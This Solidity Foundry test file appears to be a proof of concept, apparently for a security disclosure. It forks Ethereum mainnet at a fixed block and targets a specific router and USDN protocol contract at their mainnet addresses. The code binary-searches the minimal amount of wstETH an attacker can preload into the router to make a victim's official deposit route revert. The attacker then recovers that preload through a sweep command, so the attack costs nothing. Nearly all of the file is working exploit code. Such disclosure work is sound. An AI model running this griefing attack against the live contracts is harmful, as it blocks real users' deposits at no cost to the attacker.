// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

import { Test } from "forge-std/Test.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { Constants } from "@uniswap/universal-router/contracts/libraries/Constants.sol";
import { IUsdnProtocol } from "usdn-contracts/src/interfaces/UsdnProtocol/IUsdnProtocol.sol";
import { IUsdnProtocolTypes } from "usdn-contracts/src/interfaces/UsdnProtocol/IUsdnProtocolTypes.sol";

import { IUniversalRouter } from "../src/interfaces/IUniversalRouter.sol";
import { Commands } from "../src/libraries/Commands.sol";
import { IUsdnProtocolRouterTypes } from "../src/interfaces/usdn/IUsdnProtocolRouterTypes.sol";
import { IPaymentLibTypes } from "../src/interfaces/usdn/IPaymentLibTypes.sol";

contract VictimDepositWorkflow {
    IUniversalRouter public immutable ROUTER;
    IERC20 public immutable ASSET;
    IERC20 public immutable SDEX;

    constructor(IUniversalRouter router, IERC20 asset, IERC20 sdex) {
        ROUTER = router;
        ASSET = asset;
        SDEX = sdex;
    }

    function run(uint256 intendedAssetAmount, uint256 exactSdexBudget, uint256 securityDeposit) external {
        require(ASSET.transfer(address(ROUTER), intendedAssetAmount), "asset transfer");
        require(SDEX.transfer(address(ROUTER), exactSdexBudget), "sdex transfer");

        bytes[] memory priceData = new bytes[](0);
        uint128[] memory rawIndices = new uint128[](0);
        IUsdnProtocolTypes.PreviousActionsData memory previousActions =
            IUsdnProtocolTypes.PreviousActionsData({ priceData: priceData, rawIndices: rawIndices });

        IUsdnProtocolRouterTypes.InitiateDepositData memory deposit = IUsdnProtocolRouterTypes.InitiateDepositData({
            payment: IPaymentLibTypes.PaymentType.Transfer,
            amount: Constants.CONTRACT_BALANCE,
            sharesOutMin: 0,
            to: address(this),
            validator: address(this),
            deadline: type(uint256).max,
            currentPriceData: "",
            previousActionsData: previousActions,
            ethAmount: securityDeposit
        });

        bytes memory commands = abi.encodePacked(
            uint8(Commands.INITIATE_DEPOSIT),
            uint8(Commands.SWEEP),
            uint8(Commands.SWEEP)
        );
        bytes[] memory inputs = new bytes[](3);
        inputs[0] = abi.encode(deposit);
        inputs[1] = abi.encode(address(ASSET), address(this), 0, 0);
        inputs[2] = abi.encode(address(SDEX), address(this), 0, 0);

        ROUTER.execute{ value: securityDeposit }(commands, inputs);
    }

    receive() external payable { }
}

contract TestRouterMainnetPreloadGriefPoC is Test {
    address internal constant ROUTER_ADDR = 0x49f66B1616865b2a59caECb8352bbf2AC80983e1;
    address internal constant PROTOCOL_ADDR = 0x656cB8C6d154Aad29d8771384089be5B5141f01a;
    address internal constant ATTACKER = address(0xB0B);
    uint256 internal constant FORK_BLOCK = 25_715_274;
    uint256 internal constant INTENDED_DEPOSIT = 0.1 ether;
    uint256 internal constant SEARCH_HIGH = 0.001 ether;

    IUniversalRouter internal router;
    IUsdnProtocol internal protocol;
    IERC20 internal asset;
    IERC20 internal sdex;
    VictimDepositWorkflow internal victim;
    uint256 internal securityDeposit;
    uint256 internal exactSdexBudget;

    function setUp() public {
        string memory rpc = vm.envString("MAINNET_RPC_URL");
        vm.createSelectFork(rpc, FORK_BLOCK);

        router = IUniversalRouter(ROUTER_ADDR);
        protocol = IUsdnProtocol(PROTOCOL_ADDR);
        asset = IERC20(address(protocol.getAsset()));
        sdex = IERC20(address(protocol.getSdex()));
        victim = new VictimDepositWorkflow(router, asset, sdex);

        securityDeposit = protocol.getSecurityDepositValue();
        uint128 lastPrice = protocol.getLastPrice();
        uint128 lastTimestamp = protocol.getLastUpdateTimestamp();
        (, exactSdexBudget) = protocol.previewDeposit(INTENDED_DEPOSIT, lastPrice, lastTimestamp);

        deal(address(asset), ROUTER_ADDR, 0);
        deal(address(sdex), ROUTER_ADDR, 0);
        deal(address(asset), address(victim), INTENDED_DEPOSIT);
        deal(address(sdex), address(victim), exactSdexBudget);
        vm.deal(address(victim), securityDeposit);
        vm.deal(ATTACKER, 1 ether);

        emit log_named_uint("EVIDENCE_fork_block", block.number);
        emit log_named_address("EVIDENCE_asset", address(asset));
        emit log_named_address("EVIDENCE_sdex", address(sdex));
        emit log_named_uint("EVIDENCE_security_deposit", securityDeposit);
        emit log_named_uint("EVIDENCE_exact_sdex_budget_wei", exactSdexBudget);
    }

    function _trial(uint256 preload) internal returns (bool success_) {
        uint256 snap = vm.snapshot();

        if (preload > 0) {
            deal(address(asset), ATTACKER, preload);
            vm.prank(ATTACKER);
            require(asset.transfer(ROUTER_ADDR, preload), "preload");
        }

        (success_,) = address(victim).call(
            abi.encodeCall(VictimDepositWorkflow.run, (INTENDED_DEPOSIT, exactSdexBudget, securityDeposit))
        );

        bool reverted = vm.revertTo(snap);
        require(reverted, "snapshot restore");
    }

    function _findMinimalRevertingPreload() internal returns (uint256 minimalPreload_) {
        assertTrue(_trial(0), "clean victim route must succeed");
        assertFalse(_trial(SEARCH_HIGH), "search upper bound must revert victim route");

        uint256 lo;
        uint256 hi = SEARCH_HIGH;
        while (lo + 1 < hi) {
            uint256 mid = (lo + hi) / 2;
            if (_trial(mid)) {
                lo = mid;
            } else {
                hi = mid;
            }
        }
        minimalPreload_ = hi;

        assertTrue(_trial(minimalPreload_ - 1), "threshold-1 must still succeed");
        assertFalse(_trial(minimalPreload_), "threshold must revert");
    }

    function test_control_exactOfficialBudgetSucceedsWithoutPreload() public {
        victim.run(INTENDED_DEPOSIT, exactSdexBudget, securityDeposit);
        assertEq(asset.balanceOf(ROUTER_ADDR), 0, "normal route leaves no asset dust");
        assertEq(sdex.balanceOf(ROUTER_ADDR), 0, "normal route leaves no SDEX dust");

        IUsdnProtocolTypes.PendingAction memory pending = protocol.getUserPendingAction(address(victim));
        assertEq(
            uint256(pending.action),
            uint256(IUsdnProtocolTypes.ProtocolAction.ValidateDeposit),
            "deposit was initiated"
        );
    }

    function test_minimalRecoverablePreloadRevertsOfficialRoute() public {
        uint256 minimalPreload = _findMinimalRevertingPreload();
        emit log_named_uint("EVIDENCE_minimal_reverting_preload_wei_wstETH", minimalPreload);
        emit log_named_uint("EVIDENCE_threshold_minus_one_wei_wstETH", minimalPreload - 1);

        deal(address(asset), ATTACKER, minimalPreload);
        vm.prank(ATTACKER);
        require(asset.transfer(ROUTER_ADDR, minimalPreload), "preload");
        assertEq(asset.balanceOf(ROUTER_ADDR), minimalPreload, "attacker preload present");

        uint256 victimAssetBefore = asset.balanceOf(address(victim));
        uint256 victimSdexBefore = sdex.balanceOf(address(victim));
        uint256 gasBefore = gasleft();
        (bool ok, bytes memory revertData) = address(victim).call(
            abi.encodeCall(VictimDepositWorkflow.run, (INTENDED_DEPOSIT, exactSdexBudget, securityDeposit))
        );
        uint256 victimCallGas = gasBefore - gasleft();
        emit log_named_uint("EVIDENCE_reverted_victim_call_gas", victimCallGas);
        emit log_named_bytes("EVIDENCE_revert_data", revertData);
        assertFalse(ok, "victim route must revert at minimal preload");

        assertEq(asset.balanceOf(address(victim)), victimAssetBefore, "victim asset transfer reverted");
        assertEq(sdex.balanceOf(address(victim)), victimSdexBefore, "victim SDEX transfer reverted");
        assertEq(asset.balanceOf(ROUTER_ADDR), minimalPreload, "only attacker preload survives victim revert");
        assertEq(sdex.balanceOf(ROUTER_ADDR), 0, "victim SDEX rolled back");

        bytes memory commands = abi.encodePacked(uint8(Commands.SWEEP));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(address(asset), ATTACKER, 0, 0);
        vm.prank(ATTACKER);
        router.execute(commands, inputs);

        assertEq(asset.balanceOf(ATTACKER), minimalPreload, "attacker recovered full preload principal");
        assertEq(asset.balanceOf(ROUTER_ADDR), 0, "router preload recovered");
        emit log_named_uint("EVIDENCE_attacker_recovered_preload_wei_wstETH", asset.balanceOf(ATTACKER));
        emit log_named_uint("EVIDENCE_router_asset_balance_after_recovery", asset.balanceOf(ROUTER_ADDR));
    }
}
